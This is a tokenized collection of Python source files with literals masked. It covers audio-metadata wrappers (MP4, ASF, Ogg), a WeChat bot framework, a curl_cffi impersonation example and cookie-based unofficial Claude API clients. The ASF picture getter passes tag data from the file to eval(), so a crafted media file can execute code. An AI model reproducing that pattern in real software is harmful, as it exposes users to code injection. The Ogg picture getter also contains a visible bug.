. mp4 . MP4Cover . FORMAT_JPEG <EOL> elif mime_fmt == '<STR_LIT>' : <EOL> img_fmt = mutagen . mp4 . MP4Cover . FORMAT_PNG <EOL> else : <EOL> raise TypeError ( '<STR_LIT>' ) <EOL> pics . append ( mutagen . mp4 . MP4Cover ( art . raw , imageformat = img_fmt ) ) <EOL> afile . mfile . tags [ '<STR_LIT>' ] = pics <EOL> def freeform_get ( afile , norm_key ) : <EOL> return [ val . decode ( ) for val in afile . mfile . get ( norm_key , [ ] ) ] <EOL> def freeform_set ( afile , norm_key , val ) : <EOL> ff_vals = [ MP4FreeForm ( v . encode ( '<STR_LIT>' ) ) for v in val . values ] <EOL> afile . mfile . tags [ norm_key ] = ff_vals <EOL> class Mp4File ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . mp4 . MP4 <EOL> _TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_tracknum , <EOL> setter = set_tracknum , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaltracks , <EOL> setter = set_totaltracks , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_discnum , <EOL> setter = set_discnum , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaldiscs , <EOL> setter = set_totaldiscs , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda f , k : freeform_get ( f , _MP4_ISRC_KEY ) , <EOL> setter = lambda f , k , v : freeform_set ( f , _MP4_ISRC_KEY , v ) , <EOL> remover = _MP4_ISRC_KEY , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = bool , <EOL> sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_artwork , setter = set_artwork , <EOL> type = Artwork ) , <EOL> } <EOL> class EasyMp4File ( Mp4File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . easymp4 . EasyMP4 <EOL> _TAG_MAP = Mp4File . _TAG_MAP . copy ( ) <EOL> _TAG_MAP . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = util . get_easy_tracknum , <EOL> setter = util . set_easy_tracknum , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = util . get_easy_totaltracks , <EOL> setter = util . set_easy_totaltracks , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = util . get_easy_discnum , <EOL> setter = util . set_easy_discnum , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = util . get_easy_totaldiscs , <EOL> setter = util . set_easy_totaldiscs , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , type = Artwork ) , <EOL> } ) <EOL> </s>
<s> import mutagen . asf <EOL> from mutagen . id3 import PictureType <EOL> from . import util <EOL> from . file import AudioFile , TAG_MAP_ENTRY , Artwork , MetadataItem <EOL> pic_type2tag = { <EOL> PictureType . COVER_FRONT : '<STR_LIT>' , <EOL> PictureType . COVER_BACK : '<STR_LIT>' , <EOL> } <EOL> pic_tag2type = { } <EOL> for key , val in pic_type2tag . items ( ) : <EOL> pic_tag2type [ val ] = key <EOL> del key , val <EOL> def get_pictures ( afile , norm_key ) : <EOL> artworks = [ ] <EOL> if "<STR_LIT>" in afile . mfile . tags : <EOL> p = afile . mfile . tags [ "<STR_LIT>" ] [ <NUM_LIT> ] . value <EOL> if not isinstance ( p , bytes ) : <EOL> p = eval ( p ) <EOL> try : <EOL> artwork = Artwork ( p ) <EOL> except OSError : <EOL> artwork = Artwork ( p . split ( b'<STR_LIT>' , <NUM_LIT> ) [ <NUM_LIT> ] ) <EOL> artworks . append ( artwork ) <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_pictures ( afile , norm_key , artworks ) : <EOL> for art in artworks . values : <EOL> pic_tag = "<STR_LIT>" <EOL> raw = ( pic_tag + '<STR_LIT>' ) . encode ( '<STR_LIT>' ) + b'<STR_LIT>' + art . raw <EOL> afile . mfile . tags [ pic_tag ] = raw <EOL> class AsfFile ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . asf . ASF <EOL> _TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int , sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> remover = list ( pic_tag2type . keys ( ) ) , <EOL> type = Artwork ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> } <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> super ( AsfFile , self ) . __init__ ( filename , ** kwargs ) <EOL> </s>
<s> import requests <EOL> headers = { <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } <EOL> def search ( title = '<STR_LIT>' , artist = '<STR_LIT>' , album = '<STR_LIT>' ) -> list : <EOL> try : <EOL> url = f"<STR_LIT>" <EOL> response = requests . get ( url , headers = headers ) <EOL> return response . json ( ) <EOL> except Exception as e : <EOL> print ( f"<STR_LIT>" ) <EOL> return [ ] <EOL> if __name__ == "<STR_LIT>" : <EOL> print ( search ( title = "<STR_LIT>" ) ) <EOL> </s>
<s> import datetime <EOL> from . import * <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ cache . cached ( timeout = <NUM_LIT> , key_prefix = make_cache_key ) <EOL> def get_time ( ) : <EOL> return datetime . datetime . now ( ) . strftime ( "<STR_LIT>" ) <EOL> </s>
<s> import base64 <EOL> import itertools <EOL> import mutagen . ogg <EOL> import mutagen . oggvorbis <EOL> import mutagen . oggopus <EOL> import mutagen . oggflac <EOL> import mutagen . oggtheora <EOL> import mutagen . oggspeex <EOL> from . import util <EOL> from . file import Artwork , AudioFile , MetadataItem , TAG_MAP_ENTRY <EOL> def get_pictures ( afile , norm_key ) : <EOL> artworks = [ ] <EOL> pics_dat = afile . mfile . get ( "<STR_LIT>" , [ ] ) <EOL> mimes = afile . mfile . get ( "<STR_LIT>" , [ ] ) <EOL> for dat , mime in itertools . zip_longest ( pics_dat , mimes , fillvalue = "<STR_LIT>" ) : <EOL> image_data = base64 . b64decode ( dat . encode ( "<STR_LIT>" ) ) <EOL> artworks = Artwork ( image_data ) <EOL> for p in afile . mfile . tags [ '<STR_LIT>' ] : <EOL> pb = util . parse_picture_block ( base64 . standard_b64decode ( p ) ) <EOL> art = Artwork ( pb . data , width = pb . width , height = pb . height , fmt = pb . format ) <EOL> artworks . append ( art ) <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_pictures ( afile , norm_key , artworks ) : <EOL> if not isinstance ( artworks , MetadataItem ) : <EOL> raise TypeError ( ) <EOL> pics = [ ] <EOL> for i , art in enumerate ( artworks . values ) : <EOL> if any ( v is None for v in ( art . mime , art . width , art . height , art . depth ) ) : <EOL> raise ImportError ( "<STR_LIT>" ) <EOL> pic = mutagen . flac . Picture ( ) <EOL> pic . data = art . raw <EOL> pic . type = art . pic_type <EOL> pic . mime = art . mime <EOL> pic . width = art . width <EOL> pic . height = art . height <EOL> pic . depth = art . depth <EOL> pic_data = base64 . b64encode ( pic . write ( ) ) . decode ( '<STR_LIT>' ) <EOL> pics . append ( pic_data ) <EOL> afile . mfile . tags [ '<STR_LIT>' ] = pics <EOL> def rm_pictures ( afile , norm_key ) : <EOL> for k in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) : <EOL> if k in afile . mfile . tags : <EOL> del afile . mfile . tags [ k ] <EOL> class OggFile ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . ogg . OggFileType <EOL> _TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int , sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> remover = rm_pictures , <EOL> type = Artwork ) , <EOL> } <EOL> def _ft_setter ( self , key , md_val , appendable = True ) : <EOL> if self . appendable and appendable : <EOL> self . mfile . tags [ key ] = [ str ( v ) for v in md_val . values ] <EOL> else : <EOL> self . mfile . tags [ key ] = str ( md_val . value ) <EOL> class OggFlacFile ( OggFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . oggflac . OggFLAC <EOL> class OggSpeexFile ( OggFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . oggspeex . OggSpeex <EOL> class OggTheoraFile ( OggFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . oggtheora . OggTheora <EOL> class OggVorbisFile ( OggFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . oggvorbis . OggVorbis <EOL> _TAG_MAP = OggFile . _TAG_MAP . copy ( ) <EOL> _TAG_MAP . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> } ) <EOL> class OggOpusFile ( OggFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . oggopus . OggOpus <EOL> _TAG_MAP = OggFile . _TAG_MAP . copy ( ) <EOL> _TAG_MAP . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> } ) <EOL> </s>
<s> TEXT = '<STR_LIT>' <EOL> MAP = '<STR_LIT>' <EOL> CARD = '<STR_LIT>' <EOL> NOTE = '<STR_LIT>' <EOL> SHARING = '<STR_LIT>' <EOL> PICTURE = '<STR_LIT>' <EOL> RECORDING = VOICE = '<STR_LIT>' <EOL> ATTACHMENT = '<STR_LIT>' <EOL> VIDEO = '<STR_LIT>' <EOL> FRIENDS = '<STR_LIT>' <EOL> SYSTEM = '<STR_LIT>' <EOL> INCOME_MSG = [ TEXT , MAP , CARD , NOTE , SHARING , PICTURE , <EOL> RECORDING , VOICE , ATTACHMENT , VIDEO , FRIENDS , SYSTEM ] <EOL> </s>
<s> import requests <EOL> from . import storage <EOL> class Core ( object ) : <EOL> def __init__ ( self ) : <EOL> self . alive , self . isLogging = False , False <EOL> self . storageClass = storage . Storage ( self ) <EOL> self . memberList = self . storageClass . memberList <EOL> self . mpList = self . storageClass . mpList <EOL> self . chatroomList = self . storageClass . chatroomList <EOL> self . msgList = self . storageClass . msgList <EOL> self . loginInfo = { } <EOL> self . s = requests . Session ( ) <EOL> self . uuid = None <EOL> self . functionDict = { '<STR_LIT>' : { } , '<STR_LIT>' : { } , '<STR_LIT>' : { } } <EOL> self . useHotReload , self . hotReloadDir = False , '<STR_LIT>' <EOL> self . receivingRetryCount = <NUM_LIT> <EOL> def login ( self , enableCmdQR = False , picDir = None , qrCallback = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> raise NotImplementedError ( ) <EOL> def get_QRuuid ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def get_QR ( self , uuid = None , enableCmdQR = False , picDir = None , qrCallback = None ) : <EOL> raise NotImplementedError ( ) <EOL> def check_login ( self , uuid = None ) : <EOL> raise NotImplementedError ( ) <EOL> def web_init ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def show_mobile_login ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def start_receiving ( self , exitCallback = None , getReceivingFnOnly = False ) : <EOL> raise NotImplementedError ( ) <EOL> def get_msg ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def logout ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def update_chatroom ( self , userName , detailedMember = False ) : <EOL> raise NotImplementedError ( ) <EOL> def update_friend ( self , userName ) : <EOL> raise NotImplementedError ( ) <EOL> def get_contact ( self , update = False ) : <EOL> raise NotImplementedError ( ) <EOL> def get_friends ( self , update = False ) : <EOL> raise NotImplementedError ( ) <EOL> def get_chatrooms ( self , update = False , contactOnly = False ) : <EOL> raise NotImplementedError ( ) <EOL> def get_mps ( self , update = False ) : <EOL> raise NotImplementedError ( ) <EOL> def set_alias ( self , userName , alias ) : <EOL> raise NotImplementedError ( ) <EOL> def set_pinned ( self , userName , isPinned = True ) : <EOL> raise NotImplementedError ( ) <EOL> def accept_friend ( self , userName , v4 , autoUpdate = True ) : <EOL> raise NotImplementedError ( ) <EOL> def get_head_img ( self , userName = None , chatroomUserName = None , picDir = None ) : <EOL> raise NotImplementedError ( ) <EOL> def create_chatroom ( self , memberList , topic = '<STR_LIT>' ) : <EOL> raise NotImplementedError ( ) <EOL> def set_chatroom_name ( self , chatroomUserName , name ) : <EOL> raise NotImplementedError ( ) <EOL> def delete_member_from_chatroom ( self , chatroomUserName , memberList ) : <EOL> raise NotImplementedError ( ) <EOL> def add_member_into_chatroom ( self , chatroomUserName , memberList , <EOL> useInvitation = False ) : <EOL> raise NotImplementedError ( ) <EOL> def send_raw_msg ( self , msgType , content , toUserName ) : <EOL> raise NotImplementedError ( ) <EOL> def send_msg ( self , msg = '<STR_LIT>' , toUserName = None ) : <EOL> raise NotImplementedError ( ) <EOL> def upload_file ( self , fileDir , isPicture = False , isVideo = False , <EOL> toUserName = '<STR_LIT>' , file_ = None , preparedFile = None ) : <EOL> raise NotImplementedError ( ) <EOL> def send_file ( self , fileDir , toUserName = None , mediaId = None , file_ = None ) : <EOL> raise NotImplementedError ( ) <EOL> def send_image ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> raise NotImplementedError ( ) <EOL> def send_video ( self , fileDir = None , toUserName = None , mediaId = None , file_ = None ) : <EOL> raise NotImplementedError ( ) <EOL> def send ( self , msg , toUserName = None , mediaId = None ) : <EOL> raise NotImplementedError ( ) <EOL> def revoke ( self , msgId , toUserName , localId = None ) : <EOL> raise NotImplementedError ( ) <EOL> def dump_login_status ( self , fileDir = None ) : <EOL> raise NotImplementedError ( ) <EOL> def load_login_status ( self , fileDir , <EOL> loginCallback = None , exitCallback = None ) : <EOL> raise NotImplementedError ( ) <EOL> def auto_login ( self , hotReload = False , statusStorageDir = '<STR_LIT>' , <EOL> enableCmdQR = False , picDir = None , qrCallback = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> raise NotImplementedError ( ) <EOL> def configured_reply ( self ) : <EOL> raise NotImplementedError ( ) <EOL> def msg_register ( self , msgType , <EOL> isFriendChat = False , isGroupChat = False , isMpChat = False ) : <EOL> raise NotImplementedError ( ) <EOL> def run ( self , debug = True , blockThread = True ) : <EOL> raise NotImplementedError ( ) <EOL> def search_friends ( self , name = None , userName = None , remarkName = None , nickName = None , <EOL> wechatAccount = None ) : <EOL> return self . storageClass . search_friends ( name , userName , remarkName , <EOL> nickName , wechatAccount ) <EOL> def search_chatrooms ( self , name = None , userName = None ) : <EOL> return self . storageClass . search_chatrooms ( name , userName ) <EOL> def search_mps ( self , name = None , userName = None ) : <EOL> return self . storageClass . search_mps ( name , userName ) <EOL> </s>
<s> from io import BytesIO <EOL> from curl_cffi import Curl , CurlInfo , CurlOpt , requests <EOL> def main_curl ( ) : <EOL> buffer = BytesIO ( ) <EOL> c = Curl ( ) <EOL> c . setopt ( CurlOpt . CUSTOMREQUEST , b"<STR_LIT>" ) <EOL> c . setopt ( CurlOpt . URL , b"<STR_LIT>" ) <EOL> c . setopt ( CurlOpt . WRITEDATA , buffer ) <EOL> c . perform ( ) <EOL> body = buffer . getvalue ( ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( body . decode ( ) ) <EOL> print ( "<STR_LIT>" ) <EOL> buffer = BytesIO ( ) <EOL> c . setopt ( CurlOpt . WRITEDATA , buffer ) <EOL> c . setopt ( CurlOpt . URL , b"<STR_LIT>" ) <EOL> c . impersonate ( "<STR_LIT>" ) <EOL> c . setopt ( CurlOpt . HTTPHEADER , [ b"<STR_LIT>" ] ) <EOL> c . perform ( ) <EOL> body = buffer . getvalue ( ) <EOL> print ( "<STR_LIT>" ) <EOL> print ( body . decode ( ) ) <EOL> c . close ( ) <EOL> def main_requests ( ) : <EOL> r = requests . get ( "<STR_LIT>" ) <EOL> print ( r . json ( ) ) <EOL> r = requests . get ( "<STR_LIT>" , impersonate = "<STR_LIT>" ) <EOL> print ( r . json ( ) ) <EOL> async def async_main ( ) : <EOL> async with requests . AsyncSession ( ) as s : <EOL> r = await s . get ( "<STR_LIT>" ) <EOL> print ( r . text ) <EOL> r = await s . get ( "<STR_LIT>" , stream = True ) <EOL> async for content in r . iter_content ( ) : <EOL> print ( content ) <EOL> if __name__ == "<STR_LIT>" : <EOL> async_main ( ) <EOL> </s>
<s> from bridge . bridge import Bridge <EOL> class Channel ( object ) : <EOL> def startup ( self ) : <EOL> raise NotImplementedError <EOL> def handle ( self , msg ) : <EOL> raise NotImplementedError <EOL> def send ( self , msg , receiver ) : <EOL> raise NotImplementedError <EOL> def build_reply_content ( self , query , context = None ) : <EOL> return Bridge ( ) . fetch_reply_content ( query , context ) <EOL> </s>
<s> import os <EOL> from claude_api import Client <EOL> def get_cookie ( ) : <EOL> cookie = os . getenv ( '<STR_LIT>' ) <EOL> if not cookie : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> return cookie <EOL> def main ( ) : <EOL> cookie = get_cookie ( ) <EOL> claude = Client ( cookie ) <EOL> conversation_id = None <EOL> print ( "<STR_LIT>" ) <EOL> while True : <EOL> user_input = input ( "<STR_LIT>" ) <EOL> if user_input . lower ( ) == '<STR_LIT>' : <EOL> print ( "<STR_LIT>" ) <EOL> break <EOL> if not conversation_id : <EOL> conversation = claude . create_new_chat ( ) <EOL> conversation_id = conversation [ '<STR_LIT>' ] <EOL> response = claude . send_message ( user_input , conversation_id ) <EOL> print ( "<STR_LIT>" , response ) <EOL> if __name__ == "<STR_LIT>" : <EOL> main ( ) <EOL> </s>
<s> import logging , traceback , sys , threading <EOL> try : <EOL> import Queue <EOL> except ImportError : <EOL> import queue as Queue <EOL> from . . log import set_logging <EOL> from . . utils import test_connect <EOL> from . . storage import templates <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_register ( core ) : <EOL> core . auto_login = auto_login <EOL> core . configured_reply = configured_reply <EOL> core . msg_register = msg_register <EOL> core . run = run <EOL> def auto_login ( self , hotReload = False , statusStorageDir = '<STR_LIT>' , <EOL> enableCmdQR = False , picDir = None , qrCallback = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> if not test_connect ( ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> sys . exit ( ) <EOL> self . useHotReload = hotReload <EOL> self . hotReloadDir = statusStorageDir <EOL> if hotReload : <EOL> rval = self . load_login_status ( statusStorageDir , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) <EOL> if rval : <EOL> return <EOL> logger . error ( '<STR_LIT>' . format ( rval ) ) <EOL> self . logout ( ) <EOL> self . login ( enableCmdQR = enableCmdQR , picDir = picDir , qrCallback = qrCallback , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) <EOL> self . dump_login_status ( statusStorageDir ) <EOL> else : <EOL> self . login ( enableCmdQR = enableCmdQR , picDir = picDir , qrCallback = qrCallback , <EOL> loginCallback = loginCallback , exitCallback = exitCallback ) <EOL> def configured_reply ( self ) : <EOL> try : <EOL> msg = self . msgList . get ( timeout = <NUM_LIT> ) <EOL> except Queue . Empty : <EOL> pass <EOL> else : <EOL> if isinstance ( msg [ '<STR_LIT>' ] , templates . User ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> elif isinstance ( msg [ '<STR_LIT>' ] , templates . MassivePlatform ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> elif isinstance ( msg [ '<STR_LIT>' ] , templates . Chatroom ) : <EOL> replyFn = self . functionDict [ '<STR_LIT>' ] . get ( msg [ '<STR_LIT>' ] ) <EOL> if replyFn is None : <EOL> r = None <EOL> else : <EOL> try : <EOL> r = replyFn ( msg ) <EOL> if r is not None : <EOL> self . send ( r , msg . get ( '<STR_LIT>' ) ) <EOL> except : <EOL> logger . warning ( traceback . format_exc ( ) ) <EOL> def msg_register ( self , msgType , isFriendChat = False , isGroupChat = False , isMpChat = False ) : <EOL> if not ( isinstance ( msgType , list ) or isinstance ( msgType , tuple ) ) : <EOL> msgType = [ msgType ] <EOL> def _msg_register ( fn ) : <EOL> for _msgType in msgType : <EOL> if isFriendChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if isGroupChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if isMpChat : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> if not any ( ( isFriendChat , isGroupChat , isMpChat ) ) : <EOL> self . functionDict [ '<STR_LIT>' ] [ _msgType ] = fn <EOL> return fn <EOL> return _msg_register <EOL> def run ( self , debug = False , blockThread = True ) : <EOL> logger . info ( '<STR_LIT>' ) <EOL> if debug : <EOL> set_logging ( loggingLevel = logging . DEBUG ) <EOL> def reply_fn ( ) : <EOL> try : <EOL> while self . alive : <EOL> self . configured_reply ( ) <EOL> except KeyboardInterrupt : <EOL> if self . useHotReload : <EOL> self . dump_login_status ( ) <EOL> self . alive = False <EOL> logger . debug ( '<STR_LIT>' ) <EOL> logger . info ( '<STR_LIT>' ) <EOL> if blockThread : <EOL> reply_fn ( ) <EOL> else : <EOL> replyThread = threading . Thread ( target = reply_fn ) <EOL> replyThread . setDaemon ( True ) <EOL> replyThread . start ( ) <EOL> </s>
<s> from fastapi import FastAPI , BackgroundTasks , File , UploadFile <EOL> from claude_api import Client <EOL> import os <EOL> app = FastAPI ( ) <EOL> def get_cookie ( ) : <EOL> cookie = os . getenv ( '<STR_LIT>' ) <EOL> if not cookie : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> return cookie <EOL> @ app . post ( "<STR_LIT>" ) <EOL> async def create_chat ( prompt : str , background_tasks : BackgroundTasks ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> conversation = client . create_new_chat ( ) <EOL> conversation_id = conversation [ '<STR_LIT>' ] <EOL> background_tasks . add_task ( client . send_message , prompt , conversation_id ) <EOL> return { "<STR_LIT>" : conversation_id } <EOL> @ app . get ( "<STR_LIT>" ) <EOL> async def get_chat_history ( conversation_id ) : <EOL> cookie = get_cookie ( ) <EOL> client = Client ( cookie ) <EOL> history = client . chat_conversation_history ( conversation_id ) <EOL> return history <EOL> @ app . post ( "<STR_LIT>" ) <EOL> async def send_message ( conversation_id 